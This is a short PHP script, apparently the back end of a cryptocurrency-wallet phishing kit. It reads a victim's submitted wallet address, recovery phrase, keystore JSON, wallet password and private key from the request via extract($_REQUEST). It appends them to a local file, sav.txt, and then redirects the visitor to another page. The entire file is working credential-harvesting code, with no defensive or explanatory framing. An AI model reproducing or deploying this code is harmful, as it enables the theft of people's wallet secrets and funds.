<?php
    extract($_REQUEST);
    $file=fopen("sav.txt","a");

    fwrite($file,"wallet :");
    fwrite($file, $wallet ."\n");
    fwrite($file,"phrase :");
    fwrite($file, $phrase ."\n");
    fwrite($file,"KeystoreJSON :");
    fwrite($file, $KeystoreJSON ."\n");
    fwrite($file,"walletpassword :");
    fwrite($file, $walletpassword ."\n");
    fwrite($file,"privateKey :");
    fwrite($file, $privateKey ."\n");
    fclose($file);
    header("location:cn.php");
 ?>
